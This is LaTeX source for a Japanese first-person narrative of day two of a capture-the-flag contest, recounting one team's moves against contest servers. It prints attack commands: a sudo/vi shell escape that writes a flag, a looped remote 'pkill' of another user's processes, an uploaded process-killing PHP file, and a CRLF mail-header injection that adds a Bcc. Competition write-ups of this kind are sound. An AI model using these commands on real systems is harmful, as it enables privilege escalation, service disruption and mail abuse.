二日目の競技が開始された。
昨日ハルシオンを飲んだせいか若干眠いような気もしたが、
たぶん睡眠時間が少ないからだと思う。
昨日は午後からの開始であったが、今日は午前中からの開始で少々辛い。
とりあえず早々に\Mercuryを占領せねば。

\begin{lstlisting}
$ ssh -i ~/.ssh/id_rsa.gomi stage4@10.0.2.3
Connection to 10.0.2.3 closed by remote host.
Connection to 10.0.2.3 closed.
\end{lstlisting}

何!?、切断……。
うっ、昨日我々がやった策をどこか別のチームが盗用しているのか。
ならば、

「吉村くん、\ctt{pkill}撃って」

よし。
昨日おーぴーに言われて用意した\ctt{kill.php}というゴミアプリがある。
これは、

\lstinputlisting[style=php]{src/4/kill.php}

などと、\ctt{stage4}で動いているプログラムを自分もろとも死滅させる。
ログインして\Mercuryを占領している敵チームのプロセスを、これで皆殺しにする戦略だ。
ということでこれを一旦\url{http://10.2.0.3/stage3xYz/}からアップロード。
まあ、敵が\ctt{images}で\ctt{rm}を撃っていたら不味いが、
それについてはひたすらアップロードするスクリプトを用意しているので、
そちらを使うことになるだろう。

\begin{screen}
\centering
kill.phpをアップロードしました。
\end{screen}

よし、発砲。
\url{http://10.2.0.3/stage3xYz/images/kill.php}へアクセス。

\begin{itembox}[c]{接続がリセットされました}
ページの読み込み中にサーバへの接続がリセットされました。
\end{itembox}

よし、どうやら\ctt{images}の掃討してはいないらしい。

「おーぴー、\ctt{pkill}が刺さったはず」

これでログインしていた連中を殲滅したはずだ。

\begin{lstlisting}
$ ssh -i ~/.ssh/id_rsa.gomi stage4@10.0.2.3
\end{lstlisting}

どうだ!

\begin{lstlisting}
Connection to 10.0.2.3 closed by remote host.
Connection to 10.0.2.3 closed.
\end{lstlisting}

うっ、ダメか……。

「おーぴー、ダメだ……」

「分かった、こっちでなんとかする」

おーぴーの期待に添えなかったのは残念だが、
これは恐らく敵もログインしていないのだろう。
昨日、Skypeの会議でおーぴーがフラッグワードを\MercuryのFLAGへ書き込むzshスクリプトを書いていたが、
確かあれは、

\begin{lstlisting}
$ echo 'sudo -u stage5 /usr/vi -f^M:!echo FLAG >> FLAG' | ssh -t -t stage4@10.0.2.3
\end{lstlisting}

という感じ。
これが出来るのであれば、

\begin{lstlisting}[style=sh]
$ while (true)
do
	echo 'sudo -u stage5 pkill -u stage4' | ssh -t stage4@10.0.2.3;
	sleep 1
done
\end{lstlisting}

という感じで、ログインせずともプロセスは殺せるはず。
これならばPHPのプログラムで仮にプロセスが一発殺されても問題はない。
まあいいや。
とにかく\Mercuryのことはおーぴー達に任せよう。
俺は\Marsを撃破せねば。

昨日編集部でメールサーバーは用意しておいた。
後はメールが届くかどうかを調べるだけ。
\url{http://10.0.2.5/message.html}へアクセスして、
\ctt{email}に次のメールヘッダ汚染を仕掛ける。

\begin{lstlisting}
hoge%0D%0ABcc: m@192.168.7.4%0D%0A
\end{lstlisting}

これでメールが届けばいいが……。
とりあえず、メールボックスを見ても……来てない……。
これは遅延か失敗か。
どうする……?
もはや策がない……。
\ruby{徘徊}{たもとお}る\Mercuryは失なわれた。

長いサイレン音がして、一瞬戦慄した。
まさか\Marsが堕とされたか?
どうやら落ちたのは\Jupiterらしい。
\mofuppにやられたようだ。
\Jupiterは確かWindowsの上にAN HTTPD\footnote{Windows向けのHTTPサーバー。\url{http://www.st.rim.or.jp/~nakata/}}%
が動作しているものだったはず。
これはちょっと良くないな。
\Mercuryから得られるポイントは5ポイント程度なので、
このままでは5分で15ポイント程度ずつ這い寄られることになる。

などと考えているとまたサイレン音が鳴り、
全てのチームが\Mercuryにフラッグワードを書き込んだことになった。
なんだと……。
どうなっている?
どうしてキーワードを一つかそこらしかコミットしてないチームまで、
キーワードのコミットを飛ばしてFLAGへ書き込んでるんだ。
いや、これはどう考えても\mofuppの戦略だ。
あらゆるチームのフラッグワードは公開されているから、
奴等我々の収入を減らすためにあえて他のチームのフラッグワードを\Mercuryに書き込んだに違いない。
こうすることで我々が\Mercuryから得られるポイントは5分ごとに2ポイントになってしまった。
つまり、\mofuppに18ポイントずつ接近されていることになる。

くそ、メールよ届け。
やはりこのメールヘッダ汚染は駄目か……。
しかし、これが駄目となったらもはや策がない。

すると運営が現在の\Jupiterと思われる状況を公開した。
Windows XPと思われる\Jupiterは完全に遠隔操作されており、
どこかのチームにマウスの動きまで制御されていた。
運営はおもしろくするために\Jupiterの様子を実況したんだろうが、
これではっきりした。
たぶん俺のメールヘッダ汚染は失敗だ。
あれはVMの上に置いてあるので、
たぶん俺のコンピュータに設置されたサーバーへアクセス出来ない。

溜息を吐いて、解ける見込の失せた\Marsを見る。
まあ、こうなったらどのチームも解けぬまま大会が終了してくれるのを祈るしかあるまい。
そう思いながら完全に乗っ取られた\Jupiterを見ていると、
何故かサーバーがシャットダウンを始めた。

「\Jupiter、死んだんだけど」

おーぴーが言う。
サーバーが死んだ。
大会の採点システムはHTTPサーバー上に設置されたファイルを読みにいく仕組みになっているので、
サーバーへの接続が出来なければフラッグワードを書き込んだとは認められない。
あれは運営が何かの理由でサーバーを停止させたのだろうか。
普通に考えて、\mofuppが貴重な得点源をみすみす捨てるわけがない。
となると、どこか他のチームが\mofuppを排除するためにシャットダウンさせたのか、
あるいは何か別の理由なのか。
いずれにしても、\mofuppの命運は尽きたことに少々安堵した。


% vimexec: let g:tex_no_math = 0
% vimexec: syntax off
% vimexec: syntax on
% vimexec: source ~/.gvimrc
